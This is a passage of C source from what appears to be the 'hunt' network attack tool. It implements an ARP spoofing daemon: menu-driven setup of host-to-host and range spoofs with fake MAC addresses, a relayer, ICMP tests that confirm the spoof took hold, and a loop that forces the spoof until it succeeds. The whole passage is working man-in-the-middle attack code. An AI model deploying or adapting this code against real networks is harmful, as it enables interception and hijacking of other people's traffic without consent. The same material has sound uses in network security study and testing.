			return;
	} else
		can_forward = 1;
	if ((dst_start_ip = menu_choose_hostname("start target where to insert the spoof", NULL)) == -1)
		return;
	if ((dst_end_ip = menu_choose_hostname("end target where to insert the spoof", NULL)) == -1)
		return;
	if ((refresh = menu_choose_unr("refresh interval sec", 0, 100000, 0)) < 0)
		return;
	asr = malloc(sizeof(struct arp_spoof_range));
	assert(asr);
	memset(asr, 0, sizeof(*asr));
	asr->asi = NULL;
	asr->asi_count = 0;
	asr->dst_start_addr = dst_start_ip;
	asr->dst_end_addr = dst_end_ip;
	asr->src_addr = src_ip;
	memcpy(asr->src_fake_mac, src_fake_mac, ETH_ALEN);
	asr->refresh = refresh;
	asr->can_forward = can_forward;
	if (start_arp_spoof_range(asr) < 0) {
		free(asr);
		return;
	}
	list_enqueue(&l_arp_spoof_range, asr);
}

/* counts arp_spoof_info items without in_range */
static int arp_spoof_count(void)
{
	struct list_iterator li;
	struct arp_spoof_info *asi;
	int count;
	
	count = 0;
	list_iter_set(&li, &l_arp_spoof);
	while ((asi = list_iter_get(&li))) {
		if (asi->in_range)
			break;
		count++;
	}
	list_iter_end(&li);
	return count;
}

static void arp_spoof_del_item(void)
{
	int i;
	struct arp_spoof_info *asi;
	
	arp_spoof_list_items();
	i = menu_choose_unr("item nr. to delete", 0, arp_spoof_count() - 1, -1);
	if (i >= 0) {
		asi = list_at(&l_arp_spoof, i);
		stop_arp_spoof(asi);
		/* asi is freed and removed from the list in stop_arp_spoof */
	}
}

static void arp_spoof_range_del(void)
{
	int i;
	struct arp_spoof_range *asr;
	
	arp_spoof_range_list();
	i = menu_choose_unr("item nr. to delete", 0,
			    list_count(&l_arp_spoof_range) - 1, -1);
	if (i >= 0) {
		asr = list_at(&l_arp_spoof_range, i);
		stop_arp_spoof_range(asr);
		list_remove(&l_arp_spoof_range, asr);
		free(asr);
	}
}

static void arp_spoof_add_h(void)
{
	unsigned int src_ip, dst_ip;
	struct arp_spoof_info *asi_src_in_dst, *asi_dst_in_src;
#if 0
	unsigned char src_fake_mac[ETH_ALEN] = {0xEA, 0x1A, 0xDE, 0xAD, 0xBE, 0xEF};
	unsigned char dst_fake_mac[ETH_ALEN] = {0xEA, 0x1A, 0xDE, 0xAD, 0xBE, 0xEE};
#endif
	unsigned char src_fake_mac[ETH_ALEN] = {0x00, 0x60, 0x08, 0xBE, 0x91, 0xEF};
	unsigned char dst_fake_mac[ETH_ALEN] = {0x00, 0x60, 0x08, 0xBE, 0x91, 0xEE};
	char buf[BUFSIZE];
	struct mac_info *mi_src, *mi_dst;
	int refresh, src_can_forward, dst_can_forward;
	
	if ((src_ip = menu_choose_hostname("src/dst host1 to arp spoof", NULL)) == -1)
		return;
	sprintf_eth_mac(buf, suggest_mac());
	if (menu_choose_mac("host1 fake mac", src_fake_mac, buf) < 0)
		return;
	if (can_forward_question) {
		if ((src_can_forward = menu_choose_yn("is host IP router y/n", 0)) < 0)
			return;
	} else
		src_can_forward = 1;
	if ((dst_ip = menu_choose_hostname("src/dst host2 to arp spoof", NULL)) == -1)
		return;
	sprintf_eth_mac(buf, suggest_mac());
	if (menu_choose_mac("host2 fake mac", dst_fake_mac, buf) < 0)
		return;
	if (can_forward_question) {
		if ((dst_can_forward = menu_choose_yn("is host IP router y/n", 0)) < 0)
			return;
	} else
		dst_can_forward = 1;
	if ((refresh = menu_choose_unr("refresh interval sec", 0, 100000, 0)) < 0)
		return;
	
	if (!(mi_src = mac_info_get(src_ip))) {
		mac_discover(src_ip, 2);
		sec_nanosleep(1);
		if (!(mi_src = mac_info_get( src_ip))) {
			printf("ERR: host1 mac isn't known\n");
			return;
		}
	}
	if (!(mi_dst = mac_info_get(dst_ip))) {
		mac_discover(dst_ip, 2);
		sec_nanosleep(1);
		if (!(mi_dst = mac_info_get(dst_ip))) {
			mac_info_release(mi_src);
			printf("ERR: host2 mac isn't known\n");
			return;
		}
	}
	asi_src_in_dst = start_arp_spoof(src_ip, dst_ip, mi_src->mac, mi_dst->mac, src_fake_mac,
					 refresh, src_can_forward, 0);
	asi_dst_in_src = start_arp_spoof(dst_ip, src_ip, mi_dst->mac, mi_src->mac, dst_fake_mac,
					 refresh, dst_can_forward, 0);
	mac_info_release(mi_src);
	mac_info_release(mi_dst);
	if (user_arpspoof_test(asi_src_in_dst))
		user_run_arpspoof_until_successed(asi_src_in_dst);
	if (user_arpspoof_test(asi_dst_in_src))
		user_run_arpspoof_until_successed(asi_dst_in_src);
}

static void arp_spoof_del_h(void)
{
	struct arp_spoof_info *asi;
	unsigned int ip1, ip2;
	struct list_iterator li;
	int i;
	
	arp_spoof_list_items();
	i = menu_choose_unr("item nr. with src/dst or [cr]", 0,
			    arp_spoof_count() - 1, -1);
	if (i < 0) {
		if ((ip1 = menu_choose_hostname("src/dst host1 to remove", NULL)) == -1)
			return;
		if ((ip2 = menu_choose_hostname("src/dst host2 to remove", NULL)) == -1)
			return;
	} else {
		asi = list_at(&l_arp_spoof, i);
		ip1 = asi->src_addr;
		ip2 = asi->dst_addr;
	}
	list_iter_set(&li, &l_arp_spoof);
	while ((asi = list_iter_get(&li))) {
		if (asi->src_addr == ip1 && asi->dst_addr == ip2)
			stop_arp_spoof(asi);
		if (asi->dst_addr == ip1 && asi->src_addr == ip2)
			stop_arp_spoof(asi);
	}
	list_iter_end(&li);
}

static void do_test_or_refresh(struct arp_spoof_info *asi)
{
	int retval, refresh;
	
	refresh = 0;
	do {
		if ((retval = user_arpspoof_test(asi)) == 0) {
			/* error is handled by user_arpspoof_test */
			printf("ARP spoof in host %s - OK\n", host_lookup(asi->dst_addr, hl_mode));
			refresh = 0;
		} else if (retval != -2) { /* asi->dst_mac is known */
			switch (menu_choose_char("do you want to refresh ARP spoof? y/n", "yn", 'y')) {
			    case 'y':
				refresh = 1;
				send_src_spoof_to_dst(asi);
				break;
			    case 'n':
			    default:
				refresh = 0;
				break;
			}
		} else
			refresh = 0;
	} while (refresh == 1);
}

static void arp_spoof_user_test(void)
{
	int i;
	struct arp_spoof_info *asi;
	
	arp_spoof_list_items();
	i = menu_choose_unr("item nr. to test", 0, arp_spoof_count() - 1, -1);
	if (i < 0)
		return;
	asi = list_at(&l_arp_spoof, i);
	do_test_or_refresh(asi);
}

static void arp_spoof_range_user_test(void)
{
	struct arp_spoof_range *asr;
	unsigned int dst_addr;
	int i, range_test;
	
	arp_spoof_range_list();
	i = menu_choose_unr("item nr. to test", 0, list_count(&l_arp_spoof_range) - 1, -1);
	if (i < 0)
		return;
	asr = list_at(&l_arp_spoof_range, i);
	if ((range_test = menu_choose_yn("whole range test y/n", 0)) < 0)
		return;
	if (range_test)
		dst_addr = (unsigned int) -1;
	else
		if ((dst_addr = menu_choose_hostname("host to test", NULL)) == -1)
			return;
	for (i = 0; i < asr->asi_count; i++) {
		if (dst_addr == -1 && asr->asi[i]->dst_mac_valid)
			do_test_or_refresh(asr->asi[i]);
		else if (asr->asi[i]->dst_addr == dst_addr) {
			do_test_or_refresh(asr->asi[i]);
			break;
		}
	}
	if (dst_addr != -1 && i >= asr->asi_count)
		printf("host not found in range database\n");
}

void arpspoof_menu(void)
{
	char *r_menu =  "s/k) start/stop relayer daemon\n"
			"l/L) list arp spoof database\n"
			"a)   add host to host arp spoof     i/I) insert single/range arp spoof\n"
			"d)   delete host to host arp spoof  r/R) remove single/range arp spoof\n"
			"t/T) test if arp spoof successed    y) relay database\n"
			"x)   return\n";
	char *r_keys = "sklLadiIrRmtTyx";
	int run_it;
	
	run_it = 1;
	while (run_it) {
		switch (menu("arpspoof daemon", r_menu, "arps", r_keys, 0)) {
		    case 's':
			start_arp_relayer();
			break;
		    case 'k':
			stop_arp_relayer();
			break;
		    case 'l':
			arp_spoof_list_items();
			break;
		    case 'L':
			arp_spoof_range_list();
			break;
		    case 'a':
			arp_spoof_add_h();
			break;
		    case 'd':
			arp_spoof_del_h();
			break;
		    case 'i':
			arp_spoof_add_item();
			break;
		    case 'I':
			arp_spoof_range_add();
			break;
		    case 'r':
			arp_spoof_del_item();
			break;
		    case 'R':
			arp_spoof_range_del();
			break;
		    case 't':
			arp_spoof_user_test();
			break;
		    case 'T':
			arp_spoof_range_user_test();
			break;
		    case 'y':
			relay_menu();
			break;
		    case 'x':
			run_it = 0;
			break;
		}
	}
}

static struct list l_arpspoof_test = LIST_INIT(struct packet, p_next[MODULE_ARPSPOOF_TEST]);

/*
 * this function runs in hunt thread
 */
static void hunt_arpspoof_test(struct packet *p, void *arg)
{
	struct arp_spoof_info *asi = (struct arp_spoof_info *) arg;
	struct iphdr *iph = p->p_iph;
	struct icmphdr *icmph = p->p_hdr.p_icmph;
	
	if (iph->saddr == asi->dst_addr &&
	    iph->daddr == asi->src_addr &&
	    icmph->type == 0 && icmph->code == 0) {
		packet_want(p);
		list_produce(&l_arpspoof_test, p);
	}
}

static int find_asi_dst_mac(struct arp_spoof_info *asi, char *error_label)
{
	struct mac_info *mi_dst;
	
	if (!asi->dst_mac_valid) {
		mac_discover(asi->dst_addr, 2);
		sec_nanosleep(1);
		if (!(mi_dst = mac_info_get(asi->dst_addr))) {
			if (error_label)
				printf("%s", error_label);
			return -2;
		}
		memcpy(asi->dst_mac, mi_dst->mac, ETH_ALEN);
		asi->dst_mac_valid = 1;
		mac_info_release(mi_dst);
	}
	return 0;
}

int arpspoof_test(struct arp_spoof_info *asi)
{
	struct timeval tv;
	struct timespec timeout;
	struct ifunc_item ifunc_pingtest;
	struct packet *p;
	int retval;
	int i;
	
	if (!asi->dst_mac_valid) {
		fprintf(stderr, "error: try to do arpspoof_test without known dst mac\n");
		return -1;
	}
	ifunc_pingtest.func = hunt_arpspoof_test;
	ifunc_pingtest.arg = asi;
	list_enqueue(&l_ifunc_icmp, &ifunc_pingtest);
	
	for (i = 0, retval = 0; i < 3 && !retval; i++) {
		send_icmp_request(asi->src_addr, asi->dst_addr, asi->src_fake_mac,
				  asi->dst_mac, 1 + i);
		gettimeofday(&tv, NULL);
		timeout.tv_sec = tv.tv_sec + 1;
		timeout.tv_nsec = tv.tv_usec * 1000;
		while ((p = list_consume(&l_arpspoof_test, &timeout))) {
			retval = is_icmp_reply(p, asi->dst_addr, asi->src_addr,
					       asi->dst_mac, asi->src_fake_mac);
			packet_free(p);
			if (retval)
				break;
		}
	}
	list_remove(&l_ifunc_icmp, &ifunc_pingtest);
	packet_flush(&l_arpspoof_test);
	
	if (retval == 1) /* mac is spoofed - ok */
		return 0;
	else if (retval == 2) /* ping reply received but with original mac */
		return -1;
	/* ping reply wasn't received */
	return -1;
}

int user_arpspoof_test(struct arp_spoof_info *asi)
{
	char mac_buf[64];
	int retval;
	
	if ((retval = find_asi_dst_mac(asi, "dst mac isn't known - cannot do test\n")) < 0)
		return retval;
	if (arpspoof_test(asi) == 0)
		return 0;
	sprintf_eth_mac(mac_buf, asi->src_fake_mac);
	set_tty_color(COLOR_BRIGHTRED);
	printf("ARP spoof of %s with fake mac %s in host %s FAILED\n",
	       host_lookup(asi->src_addr, hl_mode),
	       mac_buf,
	       host_lookup(asi->dst_addr, hl_mode));
	set_tty_color(COLOR_LIGHTGRAY);
	fflush(stdout);
	return -1;
}

static volatile int run_arpspoof;

static void run_arpspoof_intr(int sig)
{
	run_arpspoof = 0;
}

int user_run_arpspoof_until_successed(struct arp_spoof_info *asi)
{
	switch (menu_choose_char("do you want to force arp spoof until successed y/n", "yn", 'y')) {
	    case 'y':
		if (run_arpspoof_until_successed(asi) == 0) {
			printf("ARP spoof successed\n");
			return 0;
		} else {
			printf("ARP spoof failed\n");
			return -1;
		}
	    case 'n':
		return -1;
	}
	return -1;
}

int run_arpspoof_until_successed(struct arp_spoof_info *asi)
{
	struct sigaction sa, sa_old;
	struct timespec timeout;
	int retval;
	
	if ((retval = find_asi_dst_mac(asi, "dst mac isn't known\n")) < 0)
		return retval;
	printf("CTRL-C to break\n");

	sa.sa_handler = run_arpspoof_intr;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_RESTART;
	sigaction(SIGINT, &sa, &sa_old);
	pthread_sigmask(SIG_BLOCK, &intr_mask, NULL);
	
	run_arpspoof = 1;
	while (arpspoof_test(asi) != 0 && run_arpspoof) {
		printf(".");
		fflush(stdout);
		force_arp_spoof(asi, 4);
		pthread_sigmask(SIG_UNBLOCK, &intr_mask, NULL);
		timeout.tv_sec = 5;
		timeout.tv_nsec = 0;
		nanosleep(&timeout, NULL);
		pthread_sigmask(SIG_BLOCK, &intr_mask, NULL);
	}
	if (!run_arpspoof)
		press_key("\n-- operation canceled - press any key> ");
	pthread_sigmask(SIG_UNBLOCK, &intr_mask, NULL);
	sigaction(SIGINT, &sa_old, NULL);
	return arpspoof_test(asi);
}

int arpspoof_exit_check()
{
	if (list_count(&l_arp_spoof) > 0) {
		set_tty_color(COLOR_BRIGHTRED);
		printf("there are arp spoofed addresses left in arpspoof daemon\n");
		set_tty_color(COLOR_LIGHTGRAY);
	}
	return 0;
}
